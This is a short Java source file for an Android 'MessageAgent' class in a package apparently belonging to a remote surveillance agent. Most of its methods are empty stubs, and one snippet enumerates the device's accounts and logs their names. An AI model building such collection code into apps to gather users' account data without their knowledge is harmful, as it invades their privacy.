package com.ht.RCSAndroidGUI.agent;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.util.Log;

import com.ht.RCSAndroidGUI.Status;

/**
 * 
 * @author zeno
 * 
 */
public class MessageAgent extends AgentBase {

	private final String TAG = "MessageAgent";

	@Override
	public void begin() {
		// TODO Auto-generated method stub

	}

	@Override
	public void end() {
		// TODO Auto-generated method stub

	}

	@Override
	public void parse(final byte[] conf) {
		// TODO Auto-generated method stub

	}

	@Override
	public void go() {
		// TODO Auto-generated method stub

	}

	// SNIPPET
	private void checkEmailAccounts() {
		final Account[] accounts = AccountManager.get(Status.getAppContext())
				.getAccounts();
		for (final Account account : accounts) {

			final String name = account.name;
			Log.d(TAG, name);
		}
	}

}
